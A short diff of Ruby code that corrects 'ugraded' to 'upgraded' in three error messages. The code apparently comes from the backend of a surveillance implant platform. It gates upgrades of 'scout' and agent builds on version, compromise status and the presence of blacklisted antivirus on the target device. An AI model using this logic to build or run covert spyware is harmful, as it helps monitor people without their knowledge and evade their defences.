@@ -312,7 +312,7 @@ class Item
     self.upgrade_requests.destroy_all if self.upgradable
 
     if self.scout
-      raise "Compromised scout cannot be ugraded" if self.version <= 3
+      raise "Compromised scout cannot be upgraded" if self.version <= 3
       
       # check the presence of blacklisted AV in the device evidence
       blacklisted_software?
@@ -322,10 +322,10 @@ class Item
     end
 
     # in case of elite leak
-    raise "Old agent cannot be ugraded" if self.version < 2013031101
+    raise "Old agent cannot be upgraded" if self.version < 2013031101
 
     # in case of "total crisis"
-    raise "Version too old cannot be ugraded" unless self.good
+    raise "Version too old cannot be upgraded" unless self.good
 
     factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
     build = RCS::DB::Build.factory(self.platform.to_sym)
